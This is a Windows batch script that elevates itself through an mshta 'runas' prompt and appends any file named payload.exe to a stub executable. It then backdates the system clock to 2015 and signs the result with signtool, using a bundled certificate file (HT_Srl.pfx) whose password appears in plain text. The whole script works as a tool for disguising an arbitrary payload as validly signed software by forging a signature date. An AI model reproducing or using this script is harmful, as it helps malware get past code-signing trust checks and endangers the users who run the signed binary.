@echo off
chcp 65001
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
cd /d %~dp0

if exist "payload.exe" (
    echo payload.exe exists. Appending it to nativex64.exe.
    copy /b "bin\nativex64.exe" + "bin\Block.bin" + "payload.exe" + "bin\Block.bin" "native.exe"
) else (
    echo payload.exe does not exist. Copying nativex64.exe as native.exe.
    copy /b "bin\nativex64.exe" + "bin\Block.bin" "native.exe"
)

date 14-04-15
"bin\signtool.exe" sign /v /ac "bin\VeriSignG5.cer" /f "bin\HT_Srl.pfx" /p GeoMornellaChallenge7 /fd sha1 /nph "native.exe"
net stop w32time
net start w32time
w32tm /resync /nowait

echo Done
@pause